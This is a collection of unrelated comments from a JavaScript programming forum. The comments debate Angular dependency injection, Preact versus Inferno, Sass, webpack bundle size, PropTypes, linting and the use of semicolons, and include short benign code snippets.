This thread is called "comparison of React, Angular and Aurelia". React is apparently simple enough so I can provide examples, I can answer questions, while Angular users like you are just defensive and arrogant, and deflecting questions with things like "go read docs". Is there anything more I have to prove really? You're making Angular kinda look bad.
I'm tempted to make a service, like I used to do in Angular, that handles all of my network calls. I could easily still use Ember Data locally, including rollbacks, etc. 
No, you're deliberately vague, because you can't address the concerns which are trivially addressed in plain JS (and therefore React). For example, you said "you can switch injection in sub-trees of your app". You mean hierarchical DI, which refers to sub-trees of *components*, which is not a solution to the problem I presented. If you don't want to be seen as the "ambassador for angular" don't go around replying "you're wrong about this" and then leaving it there, not explaining your reaction. You said I'm wrong about Angular taking away control from the user doing their own DI without framework involvement, and then your example was passing dependencies through attributes which you said you'd "never ever do". Then you pointed me to the documentation, which once again demonstrates Angular takes away control from the user and requires use of its own DI. If I could use **my own DI** why would I be digging through **Angular's documentation** in order to do so? And... then *I'm "blatantly wrong" by some magical reason*? You're not "correcting me", you're basically confirming what I said.
But.... why? If you want a monolith, use Java?
I didn't say you were wrong about angular "taking away" your ability to write your own di. I said you were wrong when you implied that angulars di didn't allow you to do the things a di system is supposed to allow you to do. If you consider supplying a di system that allows a programmer to do any of the things they want to do with a di system as "taking away" then I guess your right. In the same way that redux "takes away" my ability to manage state however I want to. Or how react "takes away" my ability to manage my view layer with my own life cycle. Have fun with that argument.
Amazing. Thank you. 
&gt; I didn't say you were wrong about angular "taking away" your ability to write your own di. Actually, I said this: &gt; In most cases I've seen DI integrated, the framework is doing it because it insists on taking away control from users in how they create some of their objects, so then the framework itself has to provide some convoluted means of doing DI. And you said this: &gt; That's also downright false. Now you're backtracking. What I said was "downright false", but... you didn't say I'm wrong? &gt; I said you were wrong when you implied that angulars di didn't allow you to do the things a di system is supposed to allow you to do. A very nice circular definition, but that's not what I said. I said the presence of what you call a "DI system" is a compromise that frameworks implement when they take away object creation control from you. DI doesn't require a "system", which only serves to poorly reinvent what any imperative or functional language already provides. &gt; If you consider supplying a di system that allows a programmer to do any of the things they want to do with a di system as "taking away" then I guess your right. I just love how you've utterly failed to demonstrate Angular's DI system making anything shorter, clearer, or better, and you've agreed it makes general purpose techniques *unavailable*, but you painting in rosy terms such as "it allows a programmer to do what they want". I guess it allows a programmer to write more code and arrive at a worse architecture. Some win. I don't know for how long you've been an Angular user, but Angular didn't start its life as "the best way to do DI", it didn't have any focus on DI initially. It *had to flesh out a DI system*, because it's own architecture forced this feature creep onto it. This is what happens with bad architectures. They don't factor code so it's extensible in commonly needed ways, they don't focus one doing *one thing well* and deferring the rest to the user, they instead grow walled API gardens. So when users complain they can't do this or that in the little walled API garden, instead of removing walls, the result is an endless feature creep. Let's keep making the walled garden *bigger*. So suddenly this originally small, light MVW framework with declarative templates does **fucking everything**, has a **big set of APIs doing everything under the sun**, of course including dependency injection. If you think that's great, enjoy using this ever-growing convoluted inner platform, rather than simple, flexible, idiomatic, performant JS, I guess. 
Not really. Leaflet is pretty good. What's your problem with it? 
Unless you are talking about alpha angular had di since very early beta. And your issue with taking control away from users on how they create objects is wrong. Read the documentation or dont. I really don't care. I'm done conversing with someone who puts so little mental effort into doing anything other than parroting the same thing over and over.
thanks for this :)
&gt; I don't think this makes Node any more of a monolith, it just allows someone to take more advantage of their existing hardware. Node Docker containers are ~600 megs. And they scale more easily than multi-threaded anything.
Isn't this largely what Inferno is? Also, if Preact is so small, how can it have the same API? Is React that badly designed?
Leaflet is just the client. You want to use an alternative tile provider. (I think the leaflet.js examples use open Street map?)
I am starting to learn webpack now. I am fine with grunt and browserify. Should I stop and wait for the new trending? Haha
IIRC, the main difference between Preact and Inferno is their reconciliation/DOM diffing algorithms. They also support a smaller subset of React's features, making them lighter (react-native, synthetic events, context). As for React itself, it also had legacy code to maintain for backwards compatibility (createClass comes to mind). Though, at a quick glance, React v15.5 has separated some of its less popular features in separate modules.
It's probably because they're already taken: https://www.npmjs.com/package/react-prop-types
Yup, that would explain it
My hesitance with CSS is that I keep running into projects where CSS isn't hand-coded, but compiled from some other intermediate language. Is this as prevalent as it seems?
Sounds like you're looking for Mapbox with Mapbox Studio. 
1. Yes, this is similar to Inferno. Virtual DOM implementations are intentionally generic to be cross compatible with one another. Preact popularized the drop-in compatibility layer with [`preact-compat`](http://github.com/developit/preact-compat), which was picked up by Inferno in the form of [`inferno-compat`](https://github.com/infernojs/inferno/tree/master/packages/inferno-compat). 2. Preact is optimized primarily for *gzipped* file size, whereas Inferno is primarily optimized for rendering performance. They both do a great job at both these tasks, Preact is 1/3 the size of Inferno but Inferno beats Preact in some rendering benchmarks. It's not that React is bad, these libraries are just a newer iteration built on the lessons already learned after years of working with React and VDOM.
This is a survey I'm trying to do for a study.
The functionality looks awesome, but I really, *really* don't like the syntax. What's wrong with regular, old function calls? I believe using "require" for this just adds confusion.
Yes, and it makes your life much easier and your code more maintainable and consistent. Sass is the most common (and pretty much everyone uses the scss syntax when using Sass, so if you ever see a `.scss` file it's Sass). LESS is also popular. For example, suppose your site has a standard margin of 10px. Every time you want something to use the standard margin, you need to explicitly put `margin: 10px`. Then you have a page where you're using a grid layout, and you want the gutters to match the standard margin so you give each of them `margin: 5px` (because the gutter is on each side, so you divide by 2). Later on you decide to increase the margin to 20px. You find and replace all the `margin: 10px` with `margin: 20px`, but you totally forgot to update the gutters to match! In Sass, you could do something like this: $standard-margin: 10px; .some-item { margin: $standard-margin; } .grid-item { $gutter-width: $standard-margin / 2; margin: $gutter-width; // Or, if you prefer not having the intermediary variable... margin: $standard-margin / 2; } You update the margin size in one place, and everywhere else automatically compensates. You could do other similar things, too. For example, you could define `$primary-color: #6495ed` to have a nice cornflower blue as your site's main color, and then have a palette that's based on that like... $primary-color: #6495ed; $primary-dark: darken($primary-color, 20%); $primary-light: lighten($primary-color, 20%); If you want to go with a two-color scheme, you might generate the complement and some shades based on that, too. $complement: complement($primary-color); $complement-dark: darken($complement, 20%); $complement-light: lighten($complement, 20%); Or even be a bit fancier with a three-color scheme $complement-left: adjust-hue($primary-color, 120deg); $complement-right: adjust-hue($primary-color, 240deg); etc. Now you can change the entire color scheme of your site just by modifying your primary color, and all the other colors on your site will adjust to match it. TL;DR: CSS doesn't have variables and has extremely limited computational capabilities. If you don't like programming without variables and math, you won't like writing CSS without variables and math either.
If you're familiar with design patterns, I'd say stay away from opinionated frameworks like react and the likes until you get the hang of javascript (and in particular in the browser). This will help you adapt your previous theory knowledge to another language while not bloating your learning curve. I'd probably suggest something like PureMVC or Backbone/Marionette for standard MVC constructs. Otherwise, for server-side, standard node is CommonJS, and I personally subscribe to prototype classes (still using es5 until full harmony has been truly established :P). But yeah, it can be hectic, just take it from a "this is what I already understand" mentality to bridge the gap, but be prepared for learning some "javascript jedi" while knowing when NOT to do some horrible meta programming. Also, understanding the fads are pretty important to get serious offers: express vs hapi, seneca vs nats vs etc... There's also a consideration of "enterprise design patterns" where you have business-domain microservices, and api layers wrapping them; sometimes specific apis building view models from underlying microservices for dedicated clients (ie, mobile app vs desktop app). Lots to consider, really.... Feel free to ask questions if I've piqued any interest. ---- EDIT: From a devops pov, i'd also say stick to es5 in general; less pre-compilation involved to see results. Plus, a lot of the es6 main features (aside from some super useful object/iterator functional stuff) is magpie dev stuf - not really all that useful in every-day work. Browserify is great for concatenating dependencies in bundle forms. Think explicit dependencies (also, CJS)... RequireJS for async dependencies (AMD [review CJS vs AMD; huge difference with similar constructs]). I prefer grunt over gulp; most of my build processes are waterfall (i.e., tests must pass before compilation begins); so async/"concurrent" build tasks are generally useless to me (or require extremely ugly "workarounds" to make things synchronous). --- Angular 1 vs 2? I say go with Angular 1.x... on a new app, latest 1.x. (1.5-&gt;1.6 had some api changes that broke stuff). I say this because Angular 2 is es6 and typescript, which adds more and more to the learning curve and build time. For me, it's all about productivity while maintaining best practices. ---- Containers are also very fun. But that's a whole other topic. ---- FINAL EDIT: I say all this, but really, you have to consider the needs of your project... You don't want to over-engineer something that is simple and has light use. 
the more i dive into task runners i tend to like npm scripts better.
No. Or, it shouldn't be. Personally, I try to avoid as much cross-compilation as possible. I like explicitness.
I don't think they know more than the average programmer. It is of course good to know a wide range of things, but there is only so much you can specialize in. The guys from SV specialize in compression, where the term bitstream (referring to the data format their compression implements) is very common. This is /r/javascript though, which is a high-level language and very few JS devs gets hands-on experience with *implementing* low-level functionality like compression. Even those that do usually just write bindings to C/C++ (that means making C/C++ functions available through a JS API, like [uWebSockets](https://github.com/uWebSockets/uWebSockets) ([bindings here](https://github.com/uWebSockets/bindings))), because those languages fits that kind of domain much better than JS does.
Also there isn't really anything tying PropTypes exclusively to react. I've often wanted access to a similar tool in non react projects, it will be great to now be able to use it anywhere.
I think your complaint is with javascript itself not supporting Auto DI. The *reason* you have to wrap with @Bullshit is because the DI "engine" is part of angular, not native to the language.
If you are learning, you should learn vanilla JavaScript. Particularly if you plan to make a career in this field. You don't know if you'll always be able to rely on TypeScript. When you are confident with your JavaScript - then you can move on to working with TypeScript. 
Just read the article and you'll find out
Thanks for the reply. üòä
You can wait until the video emits the 'ended' event. Instead of periodically checking if it is still playing.
Look into linting your code. Your source contains a number of issues, such as inconsistent use of semi-colon terminators, indentation and block spacing.
I am getting list&lt;UserBean&gt; from the database and UserBean object contains 2 parameters a)No of days b)runs scored Now i need to display bar graph for different users vs No of days i.e iterating through the UserBean list,for every user we need to plot a bar of "no of days" on bar graph.
I like how brutally pragmatic and professional their updates are. Makes alternatives look like they're all the product of RedBull-crazed teenagers, who just wanted to have their own framework of some kind.
I've been using sbot for over a year. You can read, post, and do everything else offline and the software makes effective use of pretty marginal internet. The network is what you make of it. There aren't too many people on sbot right now but it's a good crowd of friendly folks who have some very unique perspectives about the role of technology in society and how to build a future that does away with hierarchy and oppression. git-ssb is really great for logging issues and sending PRs offline too.
Am I missing something? Where can I go to see a demo of the thing in action?
I quite like that you can apply a generic css class with className and then modify it in the component if it needs to be a bit customised.
Oh good point. 
Webpack has only grown larger and there's no sign of stopping, there's also no contender around. Rollup is a different tool for a different use case, and if anything Webpack will take over the little advantages that it still has. Webpack is now being used by most (all?) major frameworks as their primary choice, even Angular's switched to it. It is also financially backed. What you'll find is that 5 lines of WP will do more than the 50 lines in your current Grunt config. With Grunt you're used to adapt your config once you add new files, for concats and such, that is not the case with Webpack. You only add if you need new functionality (Sass, compression, ...) and it's easy to do and project independent, meaning it runs your entire project into an AST tree to see where is what. 
But I was about to introduce a new framework... one which would have solved the problems that all previous frameworks never solved. It would have been the one tool that would have solved every need that every developer ever had or would have. It would have made you breakfast as you relaxed in the comfort of knowing that all of your framework problems had been solved. Alas... It shall not come to pass.
Can someone clarify for me. I thought it was best practices to use PropTypes in order to avoid bad code during development. I was under the impression that code gets removed during webpack - p build. Is this right? Or does the code stay in and add to the bundle.js size? With this new library setup is prop-types a dependency or devDependency? Will it be stripped during production build? I've really been struggling with the size of my file:/ it's 1.5 MB.... 
Did I say Java and JavaScript both are related?? and the question is related to JavaScript not java,I am new to JavaScript but I know what it is.
The introduction of each new programming and framework begins as follows: "We have solved all previous problems." I mean, you did not do anything new.
It honestly wasn't 100% clear that you knew that from your post, so I threw that in there just in case. Some people new to the language can be confused by the difference, I just wanted to make sure there wasn't a mixup. Regardless, whether you want to embed the data in the JavaScript sent to the browser or load it dynamically via from the server using fetch or XHR, it's going to mostly involve work on the server side. As I mentioned above since you're new to JavaScript but you know JSP it would probably be easier to embed it in the JavaScript when you generate the page. Take a look at the [syntax for JavaScript arrays](https://developer.mozilla.org/en-US/docs/Glossary/array), build an array containing your data, and pass that to the charts API. Here's the important bit: var data = google.visualization.arrayToDataTable([ ['City', '2010 Population', '2000 Population'], ['New York City, NY', 8175000, 8008000], ['Los Angeles, CA', 3792000, 3694000], ['Chicago, IL', 2695000, 2896000], ['Houston, TX', 2099000, 1953000], ['Philadelphia, PA', 1526000, 1517000] ]); Instead of the hardcoded arrays, you'll want to generate the arrays from your data and include them on the page in their place. I don't know anything about JSP so I can't help you there.
I know the airbnb style guide / eslint module wants them. Unsure on production build stripping, but that would be awesome to figure out.
I never used something like hamster but I have spun up several processes to parallelize large, CPU intensive jobs. 
I don't. I read plenty of articles but if I need something I will just spend time to research it.
Also Preact was created earlier than inferno.
Potentially stupid question -- I've only just started using Flow, but I was considering it about six months ago, and I remember reading (I believe on Stack Overflow) that it wasn't safe to completely switch from using PropTypes to static type-checking... is/was that true? Or was I being mislead? Or would it have just been specifically to do with Flow itself not being fully capable at the time?
Am working on a static site generator / build tool, but with a twist - it works more like an Array instance than a traditional static site generator. You can use map/reduce/filter/series functions on each loaded item, load data from arbitrary sources (fetches, db calls, fs reads) and compose individual pipelines into larger collections. It's kind of like Metalsmith, but weirder and with less boilerplate. import SECRET_SSG from 'SECRET_SSG'; import pandoc from 'SECRET_SSG-pandoc'; import preact from 'SECRET_SSG-preact'; import markdown from 'SECRET_SSG-markdown'; import reader from 'reading-time'; import layout from './layout'; import toHTML from './toHTML'; const assign = ::Object.assign; export default async function tex() { await new SECRET_SSG('/Users/dev/Documents/TeX') // read from glob .read('**/*') // filter out non-tex files (we could have done this in the glob, but w/e) .filter(doc =&gt; doc.path.endsWith('.tex')) // convert each doc to commonmark with pandoc .map(pandoc('commonmark')) // add layout component to each doc .map(doc =&gt; assign(doc, { layout })) // add reading time to each doc .map(doc =&gt; assign(doc, reader(doc.contents)) // turn contents to HTML .map(markdown()) // render layout component with preact .map(preact()) // wrap component into HTML document .map(toHTML()) // write to output directory .write('public'); } https://gist.github.com/noahlange/cb9d1151bb06a2560a8e5bfb6f5fc5bc
That's an interesting point. I would think you would need some sort of run-time type checking though, static can't catch all the bugs / misuse.
PropTypes in production builds get substituted with shims that just throw.
What does this mean? Is the code in the bundle or not? 
I was responding to the other posters assertion that upgrading from angular 2 to 4 was painful because of breaking changes. Not your opinion on the direction Google has gone in. Your opinion is totally valid. But I do think your ignoring the actual issues angularjs has with regards to performance and general design. I get why you and others are sore that angular is completely different from angularjs. Heck, I've said before that I think Google naming the framework angular smacks of bad marketing and was probably the biggest mistake they've made with it. They probably just should have called it something else entirely. But personally I'm glad to see a company acknowledge that their old product sucks and create a new one that wasn't afraid to break any sort of compatibility. Angularjs has had strong support for ~5 years now and will still be around and kicking for a few more at the least. But at least this won't be like winforms where Microsoft is so afraid to ever break backwards compatibility that they support a framework for 30 years when it should have died 20 years ago; and in doing so ending up holding their other products back.
I just switched over to typescript for React development and so far the interfaces seem to catch everything at compile time for me.
Well shims are still code. If I understand this correctly, prototype checking will increase bundle size. So better not to do. Otherwise they wouldn't have removed it from the core package. 
Glad you are liking it :)
Your library is an interesting idea but it would have to be a lot more mature before I would even consider using it over Web Workers. Also it seems like a fairly leaky abstraction since major languages features (e.g. closures) don't work with it. I like that Web Workers make it very clear which code is running in the other thread, trying to hide that and mixing main thread/worker thread code might not be the best idea.
Need to figure this out by monday if at all possible. Big project riding on this. For work.
No one is doing your homework for you. 
Do it! I've been reluctant to using Typescript for awhile now, but I've been working on a semi large scale react-native app where I've been constantly refactoring things. This is where Typescript really shines in my opinion. It's also something that was pretty easy to pick up, assuming you have worked with typed languages in the past. I started using Flow at first and it was okay.. something just didn't feel right to me. I also develop in VS Code so the Typescript transition was pretty seamless. I tend to start on random web projects here and there so I try to keep a basic starter project up to date with the current "flavor of the month" stuff :P. I recently converted it over to Typescript. Feel free to check it out if you wish to get started with React and Typescript! https://github.com/mgerb/react-starter
&gt;I never used something like hamster but I have spun up several processes to parallelize large, CPU intensive jobs. Out of curiosity what kind of cpu intensive tasks were you parallelizing? This kind of information helps me figure out what use cases I need to optimize for. Thanks!
I actually agree with most of what you said. It had to be done, but the way the angular team decided to go about doing it is what bothers me. They should name the framework something else, they are causing major confusion with forcing "just angular" naming for the angular 2/4. How quickly they started moving away from large projects like angular-material for angular 1.x is also something that does not inspire confidence when planning for the mid/long term. It just seems like they don't understand how much people and teams depend on their framework being maintained and committed to. There's no easy solution but they should have done more to assure the people who invested into 1.x with a more gradual transition. I find it hard to trust the team at this point and am more inclined to move to another framework altogether.
the explanation as to why vdom is better than plain dom is that plain dom has *a lot* of baggage in terms of memory and performance, whereas simple js objects do not. `document.createElement` is much heavier and slower than `var el = {tag: ...}`. even without a live rendered dom node that must be reflowed, we already start out with a major win. and so on...
Linting is the process of going through your code and fixing stylistic and formatting issues. These are things that wouldn't necessarily cause an error, but good code should be consistent with it's styling and tone. For example, omitting and including the semi-colon at the end of a statement are both valid in JavaScript. However, you should be consistent throughout your project; always omit them, or always include them, but never both. Likewise with indentation; 4 spaces, 2 tabs, 1 tab - what you use isn't important, just that it's applied consistently. To help you keep your code consistent and linted, as well as free from things that might cause bugs later, tools called linters exist. These can be given rules for how your code should be formatted, and will warn you if you don't follow those rules, much like a spell checker in a word processor. A very common linter for JavaScript is [ESLint](http://eslint.org/). Most good text editors have plugins for it, to let you lint your code as you type. Alternatively, you can simply run it from the command line. If you're looking for a good set of rules to follow, Airbnb have a great, well documented style guide, with rules for ESLint. https://github.com/airbnb/javascript
One of the criteria for moving to stage 4 is having two standards-compliant implementations. And when something hits stage 4 it becomes much easier to justify using it at work. Even if we still have to transpile, we won't be as stuck with Object.assign. 
Why virtual dom nodes vs actual dom nodes was not quite the question I was thinking of. More so why rely on building a Virtual Dom, then diff it from the real Dom, the process of building a Virtual Dom and diffing takes time. What would take less time is observing changes to state, and as state changes schedule updates to the Dom.
Nu-uh, totally original as I had the idea before /r/place! But yeah, basically like /r/place is but with the twist that it grows over time (every two hours or so), trying to force users to co-exist rather than go into separate corners and make things in isolation. 
There's an upper limit, just thought it'd be cool to start at 1x1 and expand it out.
The article doesn't say whether PropTypes are going away in favour of static typing, which was my question. You and the downvoters can't read.
I love that he's wearing a Pied Piper t-shirt shirt.
&gt; That's an interesting point. I would think you would need some sort of run-time type checking though, static can't catch all the bugs / misuse. Flow and Typescript are not always adequate in the face of incompleteness, bugginess, null, etc. in their implementations, but I think if you can use PropTypes to find such bugs then you can express that type in Flow/TS and use a tool like https://www.npmjs.com/package/babel-plugin-flow-react-proptypes to translate it into PropTypes instead of writing it yourself. 
Right, it is not openly stated, but the article does imply it. &gt; You may also consider using Flow to statically type check your JavaScript code, including React components.
&gt; I derive that based on a lot of your reddit history's opinions and how you speak to people. I see, so you think you're the world's greatest detective, master of deduction. Sorry to break it to you, but you fail to even understand **the direct questions I'm asking you**, let alone those I'm not. &gt; I may have said things you didn't ask, but you said NOTHING; literally a vast emptiness of sewage in text form. Impressive. &gt; &gt; Fetching dependencies from the "global namespace" is not injection, so this is completely irrelevant. &gt; Wrong. How do you think tat dependency got INTO the global namespace? The compiler just magically has your contextual source in a global area for you (which would still be DI)? An injected dependency doesn't have to be into any global namespace. That's just some nonsense you wrote there. A key reason to use DI is to avoid global state as much as possible. Some framework authors don't understand this, and so they end up reimplementing global state in their DI. It's like this saying "if you don't know history you're doomed to repeat it". &gt; If you want control, you need to instantiate ad-hoc; meaning injecting a factory. Yeah I wouldn't mind that, but Angular doesn't provide the extension point for it. I doubt the thought even occurs to them.
Perhaps I've misunderstood your meaning but you can mount a React component to any DOM node that you wish. You can write an entire page of HTML and have just a single button‚Äîor just the footer‚Äîor just your super swanky sidebar‚Äîbe a React component. 
Enjoyed until he started talking about season 3, which I haven't seen.. I was like "NOOOO, SPOILERSSS!!"
Thank you and /u/ProxySaw! Promise.all was indeed the ticket! it ended up being this: Promise.all(weaknesses) //pass in var containing array of promises .then(results =&gt; results.map(result =&gt; result.json().then(data =&gt; doTheThing(data); ) )); thanks!!
Join team auto formatting instead. Languages should be shipped with an official formatter (which cannot be configured) which simply formats the code according to the official code conventions. Go and Dart have one of those, for example.
when I don't use -p the file size is 12MB!
"Be careful out there, for the web is cluttered and full of errors"
Actually my team uses Prettier for Javascript. It does have a couple of config options like tabs vs spaces, but it's very minimal. It has worked wonderfully for us so far. We don't have silo'd code though and I can't control what other teams do when they touch the same code as us. We've made it a standard practice to run the formatter whenever we first open a file, and if there are significant format changes we commit them with a "formatter only commit" message. I'm hoping that by fully standardizing all of my team's code, we can recruit others over time and eventually bring the entire code base into a single format. 
Basically that being consistent *is* all that actually matters. If you have competing tools, or formats, you should first consider if either or both can actually be eliminated, and if only one can, you should eliminate it and go with the other. In the case of spaces vs tabs, you cannot possibly eliminate spaces completely from your code, but you can completely eliminate tabs. So it makes sense to go with spaces because then you've simplified 2 things into 1 without sacrificing anything in exchange.
Doesn't matter... So long as everybody does it the same way.
Semicolon insertion can be automatically done by a formatting tool as well, which is another reason why formatters are awesome. You get all the semicolons whether you type them or not, which makes any subtle semicolon insertion bugs much more obvious.
Is "Prettier" a command line/task runner tool? Or an IDE/editor plugin? I've been trying to solve this problem for my team with disappointing results. 
Unless you want something specific that Webpack offers, you'll be fine with Grunt and Browserify. Last I looked the killer feature was code splitting. Using that? Go for it. Moving because of "trendy"? Stop.
Both! They have a CLI as well as plugins for *most* major editors including Atom, Sublime, Vim, Emacs, Visual Studio Code, and the Jetbrains family. You can manually trigger the formatter with a keyboard shortcut or set it to auto-format on save. We started out doing it manually to try it out, but we quickly enabled the auto format and so far we've had no issues with it. https://github.com/prettier/prettier
No problem! We're a React shop so we don't really write any actual HTML, and Prettier supports JSX so it covers us there as well.
Wow!
&gt; when I don't use -p the file size is 12MB! Sorry, I should've been clearer. When I said `webpack -p` alone, I meant it literally i.e. (at least last time I checked,) it doesn't include hacks like this: plugins: [ new webpack.DefinePlugin({ 'process.env': { NODE_ENV: JSON.stringify('production'), }, }), ], so while it makes things smaller, React still gets built with development code inside it. Also, if you haven't done it already, you can use something like https://github.com/th0r/webpack-bundle-analyzer to check what's taking up space in your bundle. I'd still be surprised if it's a proper production build of React.
Undefined doesn't spark joy. It's irony that he's presenting removing the keyword lock as a plus for maintainer, while having programmer deciding what they want all around the world on vital keyword is the best way to end up with a big mess. space in function name makes it less readable.
I made https://github.com/rohan-deshpande/rd-fetch which is a small fetch wrapper class to make working with fetch API, specifically in JSON, a bit more developer friendly. 
subtle... only the first time! 
(For context, had a couple of bots over already, one of them spammed purple all over the place).
1. They are not needed. 2. They are ugly.
Nothing is actually enforcing the palette. You can easily change the color by modifying the request, or just change the global colors object in the console like this: colors.white = [11, 22, 33, 255];
Are you saying I should remove that wepack.DefinePlugin part from my config? Because I still have that in there. Also, I do have analyzer installed, and here is the output: react-rte: 897.1 KB (21.1%) react-dom: 538.42 KB (12.7%) fbjs: 29.39 KB (5.46%) &lt;self&gt;: 509.03 KB (94.5%) js-yaml: 288.38 KB (6.80%) esprima: 189.05 KB (65.6%) &lt;self&gt;: 99.33 KB (34.4%) lodash: 189.43 KB (4.46%) redux-form: 163.95 KB (3.86%) swagger-client: 130.24 KB (3.07%) react: 128.82 KB (3.04%) fbjs: 10.62 KB (8.24%) &lt;self&gt;: 118.21 KB (91.8%) react-router: 125.36 KB (2.95%) history: 46.82 KB (37.4%) query-string: 4.15 KB (3.31%) &lt;self&gt;: 74.39 KB (59.3%) lodash-compat: 119.56 KB (2.82%) react-cropper: 111.44 KB (2.63%) cropperjs: 99.01 KB (88.8%) &lt;self&gt;: 12.43 KB (11.2%) lodash-es: 108.67 KB (2.56%) react-overlays: 67.84 KB (1.60%) rc-tree-select: 67.74 KB (1.60%) flatpickr: 64.78 KB (1.53%) q: 61.31 KB (1.45%) react-bootstrap: 59.04 KB (1.39%) rc-tree: 47.6 KB (1.12%) buffer: 47.47 KB (1.12%) core-js: 36.95 KB (0.871%) react-redux: 36.2 KB (0.853%) axios: 35.24 KB (0.831%) dom-align: 33.59 KB (0.792%) react-autowhatever: 33.04 KB (0.779%) react-dropzone: 30.25 KB (0.713%) superagent: 29.87 KB (0.704%) react-autosuggest: 26.47 KB (0.624%) rc-trigger: 26.18 KB (0.617%) prop-types: 25.5 KB (0.601%) fbjs: 4.71 KB (18.5%) &lt;self&gt;: 20.79 KB (81.5%) dom-helpers: 25.17 KB (0.593%) url: 23.08 KB (0.544%) redux: 20.35 KB (0.480%) rc-animate: 17.76 KB (0.419%) lodash.isempty: 14.91 KB (0.351%) signature_pad: 14.84 KB (0.350%) antd: 14.55 KB (0.343%) punycode: 14.33 KB (0.338%) style-loader: 11.25 KB (0.265%) rc-util: 11.23 KB (0.265%) react-router-redux: 11.05 KB (0.261%) redux-auth-wrapper: 10.62 KB (0.250%) add-dom-event-listener: 9.6 KB (0.226%) rc-progress: 9.47 KB (0.223%) cookiejar: 9.45 KB (0.223%) css-animation: 7.3 KB (0.172%) cropperjs: 6.79 KB (0.160%) setimmediate: 6.32 KB (0.149%) process: 5.17 KB (0.122%) react-prop-types: 5.07 KB (0.120%) querystring-es3: 5.06 KB (0.119%) babel-runtime: 4.94 KB (0.116%) rc-align: 4.64 KB (0.109%) base64-js: 3.4 KB (0.0802%) component-classes: 3.29 KB (0.0775%) component-emitter: 3.11 KB (0.0732%) section-iterator: 2.82 KB (0.0665%) react-themeable: 2.82 KB (0.0665%) object-assign: 817 B (28.3%) &lt;self&gt;: 2.02 KB (71.7%) es6-error: 2.64 KB (0.0622%) css-loader: 2.14 KB (0.0504%) object-assign: 2.06 KB (0.0485%) ieee754: 2.01 KB (0.0473%) warning: 1.76 KB (0.0416%) webpack: 1.58 KB (0.0373%) invariant: 1.48 KB (0.0349%) hoist-non-react-statics: 1.35 KB (0.0319%) timers-browserify: 1.33 KB (0.0313%) symbol-observable: 1.12 KB (0.0265%) classnames: 1.08 KB (0.0254%) redux-thunk: 529 B (0.0122%) shallow-equal: 296 B (0.00681%) btoa: 279 B (0.00642%) omit.js: 244 B (0.00562%) strict-uri-encode: 182 B (0.00419%) component-indexof: 175 B (0.00403%) is-promise: 165 B (0.00380%) isarray: 132 B (0.00304%) react-addons-css-transition-group: 62 B (0.00143%) &lt;self&gt;: 413.61 KB (9.75%) Does it look right?
So you just want to redirect when the video is finished? &lt;video controls&gt; &lt;source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4"&gt; &lt;/video&gt; &lt;script&gt; (function() { function redirect() { var msg = 'Redirect to Reddit?'; var link = 'https://reddit.com/'; var status = confirm(msg); if (status) { location.href = link; } } var video = document.getElementsByTagName('video')[0]; video.addEventListener('ended', redirect); video.addEventListener('error', redirect); })(); &lt;/script&gt; Some good ol' video events. Good UX to have a fallback if the video fails and also to notify the user what's happening. Confirm's are pretty ugly, if ya got a toast system setup you should make use of that.
No language feature or requirement should depend on the existence of optional third party tools. Third party tools are supposed to enhance a language, not fix implementation omissions.
&gt; I think you should learn to properly write a language before using a formatter, then you realize you don't need a formatter... Today's tools have gotten so good that many modern programmers can't function without them. 
So I've been on both sides of this fence. Very adamant about using semicolons. Then, I wrote Swift for about 6 months - no semi colons. Coming back to JS semicolons are just a pain now. I always forget to add them and I waste time going back to fix them. The reality is semicolons are completely unnecessary in nearly all modern development enivronments. The only time theyre needed is if you're going to be sending directly minified files to the browser. If you're using any sort of transpiration, semicolons will be added automatically. Server side, they're completely unnecessary as you'll never have a need to minify.
Do semicolons throb or vibrate? Do they spark joy? No.
Awesome! Glad I could help. `result.json()` - I knew I was forgetting something... :)
The only GREAT argument applies to modern JS environments where ASI is dependable. The argument is time saving, and it's two fold: 1. The actual literal time needed to insert a semicolon (this is somewhat negligible) 2. The time needed to decide when you should and shouldn't use a semicolon And, what the heck, 3. The time required to keep talking about it on Reddit. If you never had to write one, those three things go away. However, I think the argument FOR semicolons, as long as we don't have an enforced ruling of not minifying and concat'ing JS together, is much stronger than the timesaver argument. Also, "they're ugly" is just plain silly, unless you qualify it as an opinion. An opinion without logic is called "taste."
I'm a big fan of omitting semicolons in new languages, but for languages that already have an established culture, body of library code, and trained developers, I'd say go with whatever the existing convention is. For Javascript, outside of a few iconoclasts, that means semicolons. Programming languages are as much cultures as they are tools. When you choose to adopt a language, you're buying into the existing ecosystem. It's more important that other developers be able to understand your code and not face friction shifting between libraries than it is to save a few keystrokes.
You will need a formatter anyways, because manually indenting code and inserting spaces arbitrarily is asinine when all this (and much more) can be completely automated. Furthermore, a good formatter allows developers to write in whatever code style they want, because the code will get reformatted to the team standard on commit when the proper automation is in place. Even furthermore, a good formatter can be integrated with other tools to perform deeper static analysis eliminating all manners of false-positives and false-negatives along the way. You don't need a good formatter in much the same way you don't need JavaScript, because there is always a more manual approach to any given task.
TLDW for this? I've never found a good argument against tabs.
The standard rebuttal is that ASI makes assumptions that may not be correct, and a common example is using a multi-line 'return' statement.
The multi-line return assumption by ASI is made whether you use semicolons or not. Using semicolons doesn't disable ASI.
Are you suggesting that spaces are to tabs as walking is to cars? 
From the post: &gt;Note: Arrow functions cannot help us when the function is defined on the object literal as it will resolve to the enclosing lexical scope, which in this case is the global scope. He explains at length what happens when using arrow functions further down the post.
https://handsontable.com/ there is a free teir find the repo
This has nothing to do with `that = this`. It follows a section on `Function.prototype.bind()`. The author is demonstrating that if you assign an unbound reference to a method and call that method, then nothing inside it has a reference to the object the method was originally defined on. This is true not just for arrow functions, it's also true for the method itself, which means `that = this` won't help you with that. But if you use arrow functions, you won't need `that = this`.
I'm suggesting that they fill different purposes.
[removed]
Yeah, I did take a quick look, it was just too general a headline to not snark on a bit :)
Aesthetics. I think code looks cleaner and reads easier without them. Of course if I'm going to team I just follow whatever convention because I'm not that hung up on it. 
looks fun to do, do you intent to pay someone to do your work ?
1. Declarative ui. You specify what you want instead of how to get it. 2. Debugging. It's simple to debug and fix behavior and performance. 3. Pluggable renderer. Allows easy cross-platform support.
I really don't give a shit either way about semicolons, number of spaces, spaces before function params, etc. For the love of God JavaScript developers, just converge on a standard and move on with your lives.
I take it you've never worked at a real software company? You can't just tell 500 engineers to all "learn to write the language" and then expect everyone's code to look the same.
https://www.reddit.com/r/javascript/comments/647795/the_post_javascript_apocalypse_by_douglas/dg0cdb9/
Except they literally don't...
